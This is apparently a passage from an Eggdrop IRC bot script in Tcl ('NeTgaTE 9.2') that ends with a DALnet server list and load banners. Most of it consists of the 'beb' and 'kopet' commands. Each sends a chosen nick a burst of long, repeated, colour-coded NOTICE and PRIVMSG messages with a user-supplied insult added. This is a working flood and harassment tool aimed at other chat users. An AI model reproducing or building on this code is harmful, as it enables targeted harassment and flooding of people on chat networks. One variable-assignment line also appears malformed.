  puthelp "NOTICE $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  puthelp "PRIVMSG $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  puthelp "NOTICE $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  puthelp "PRIVMSG $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  puthelp "NOTICE $person :$rest ,4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ"
  putlog "  -> !$hand! beb $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :  Usage: beb <nick> <*add your insult to injury is better :)*>"
 }
}
proc pub_kopet {nick uhost hand channel rest} {
 set person [lindex $rest 0] 
 set rest [lrange $rest 1 end]
 if {$rest!=""} {
  puthelp "PRIVMSG $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  puthelp "NOTICE $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  puthelp "PRIVMSG $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  puthelp "NOTICE $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  puthelp "PRIVMSG $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  puthelp "NOTICE $person :$rest ,1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#"
  putlog "  -> !$hand! kopet $person"
  return 0
 }
 if {$rest==""} {
  puthelp "NOTICE $nick :  Usage: kopet <nick> <*add your insult to injury is better :)*>"
 }
}

##### DALNET SERVER #######
set [lines "hvievih"] {
hotspeed.dal.net
mesra.dal.net
redemption.ix.us.dal.net
}
putlog "==============================="
putlog "NeTgaTE 9.2 LoadEd"
putlog "Reported any bugs to #NeTgaTE"
putlog "Question Go To #NeTgaTE-HeLp"
putlog "Email: admin@netgate.cjb.net"
putlog "==============================="
putlog "this is line 10202"
